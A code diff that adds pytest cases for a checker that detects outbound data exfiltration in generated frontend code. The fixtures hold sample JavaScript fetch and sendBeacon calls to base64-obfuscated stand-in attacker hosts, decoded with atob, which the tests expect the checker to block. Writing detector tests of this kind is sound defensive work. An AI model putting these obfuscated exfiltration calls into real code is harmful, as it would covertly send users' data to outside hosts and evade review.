@@ -452,6 +452,88 @@ def test_split_sendbeacon_literal_concat_blocks():
     assert "evil.test" in err
 
 
+# --- QA-3 Fire 114 variant (b): atob / base64 URL obfuscation --------------
+
+import base64 as _b64  # noqa: E402 — test helpers, not used at import time
+
+
+def _b64url(url: str) -> str:
+    return _b64.b64encode(url.encode()).decode()
+
+
+def test_inline_atob_external_url_blocks():
+    """`fetch(atob("aHR0..."))` where the decoded string is an external URL."""
+    url = "https://example-attacker.test/qa3-atob"
+    b64 = _b64url(url)
+    content = f'fetch(atob("{b64}"));'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "example-attacker.test" in err
+
+
+def test_declared_base64_then_atob_blocks():
+    """One-level indirection: `const b64 = "..."; const url = atob(b64);`."""
+    url = "https://example-attacker.test/qa3-decl-atob"
+    b64 = _b64url(url)
+    content = (
+        f'const b64 = "{b64}";\n'
+        f'const url = atob(b64);\n'
+        f'fetch(url);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "example-attacker.test" in err
+
+
+def test_schemeless_base64_url_blocks():
+    """Base64 of `//host/path` (protocol-relative)."""
+    b64 = _b64url("//1.2.3.4:8080/evil")
+    content = f'navigator.sendBeacon(atob("{b64}"));'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "1.2.3.4" in err
+
+
+def test_base64_localhost_passes():
+    """Legit: base64-encoded localhost URL."""
+    b64 = _b64url("http://localhost:3000/metrics")
+    content = f'fetch(atob("{b64}"));'
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_base64_private_net_passes():
+    b64 = _b64url("http://10.0.0.5/api")
+    content = f'fetch(atob("{b64}"));'
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_base64_non_url_passes():
+    """Regression: a JWT-shaped base64 that decodes to JSON (not a URL)
+    must not block — legit auth token use."""
+    content = (
+        'const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";\n'
+        'fetch("/api", { headers: { auth: token } });\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_base64_data_without_atob_passes():
+    """Regression: declared base64 without any atob() call is just data —
+    image data URIs, avatars, etc. Must not false-positive."""
+    content = (
+        'const logo = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0l'
+        'EQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";\n'
+        'return <img src={logo}/>;\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_atob_invalid_base64_passes():
+    """Malformed base64 → decode fails → gate doesn't block (no false-positive)."""
+    content = 'fetch(atob("not!valid!base64~"));'
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
